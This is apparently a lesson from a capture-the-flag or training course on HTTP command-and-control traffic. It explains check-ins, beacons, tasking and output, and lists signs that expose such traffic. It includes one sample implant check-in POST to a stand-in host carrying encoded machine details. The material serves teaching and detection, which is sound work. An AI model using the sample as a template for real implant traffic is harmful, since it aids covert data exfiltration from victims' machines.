Most malware is a client. It runs on the victim's machine and asks a server, the **command and control** (C2) server, what to do. Over HTTP it looks like a browser visiting a website, which is the point: web traffic is allowed out of almost every network.

## The shapes

**Check-in.** The first request after the implant starts. It introduces the machine: an ID, the host name, the user, the operating system. Often encoded (base64) or encrypted.

```http
POST /api/v2/sync HTTP/1.1
Host: c2.example.test
User-Agent: Pebble/2.4 (Win64; build 5521)
Content-Type: application/x-www-form-urlencoded

d=N2YzYTljMWU1YjJkNDA4NnxTQU5EQk9YLTAxfGFuYWx5c3R8...
```

**Beacon.** After checking in, the implant sleeps and asks again, over and over: "anything for me?". The interval (the *sleep*) is often 30 to 300 seconds. Some add *jitter*, a random part, to look less regular.

**Idle reply.** Nothing to do: a short fixed answer, like `OK`, `{}`, or an empty 200.

**Tasking.** Something to do: a command, a URL to download, a script to run. It looks different from the idle reply: longer, or another content type.

**Output.** The implant sends back what the task produced, usually in another POST.

## What gives it away

- **Regular timing.** People click irregularly; a beacon does not.
- **The same request, repeated.** Same path, same headers, similar body size.
- **The User-Agent.** Every HTTP client says what it is. Implants often hard-code one: a browser that is years old, a misspelt one, or a made-up name (`Pebble/2.4`). Compare it to what real browsers on that machine send.
- **Custom headers.** `X-Client-Id`, `X-Session`: real sites use custom headers too, but an implant's are fixed and often carry IDs or keys.
- **The host.** New domains, odd names that imitate real services (`winsvc-telemetry`), or bare IP addresses.
- **Methods and status codes.** `GET` asks for something, `POST` sends something. `200` is OK, `404` not found, `403` forbidden, `302` a redirect to the `Location` header.

## Why it matters later

The live puzzles are C2 servers. To get anything out of one you have to send what the implant sends: the right path, method, headers and body. Reading the check-in in a capture is the first half of that; replaying it (modules 3 and 9) is the second.
